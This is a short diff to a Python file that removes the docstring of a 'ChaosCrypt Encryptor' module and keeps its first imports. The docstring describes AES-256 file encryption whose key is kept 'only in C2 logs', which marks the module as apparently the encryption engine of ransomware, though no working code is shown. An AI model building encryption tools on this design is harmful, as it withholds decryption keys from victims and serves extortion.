@@ -1,22 +1,3 @@
-"""
-ChaosCrypt Encryptor — AES-256-CBC + Streaming Encryption Engine
-==================================================================
-AES-256-CBC шифрування з PKCS7 padding, random IV, SHA256 integrity.
-
-  - AES-256-CBC з випадковим IV на кожен файл
-  - PKCS7 padding
-  - 32-байтний ключ (256 біт) з os.urandom
-  - IV зберігається на початку зашифрованого файлу
-  - SHA256 хеш оригіналу для верифікації після розшифровки
-  - Atomic file operations (tmp -> rename)
-  - Platform-native file locking (fcntl/msvcrt)
-  - Backup оригіналу (.bak)
-  - Disk space check перед шифруванням
-  - Ключ НЕ зберігається в .meta (тільки в C2 логах)
-
-Fallback: XOR-ROTATING якщо pycryptodome не встановлений.
-"""
-
 import os
 import sys
 import hashlib
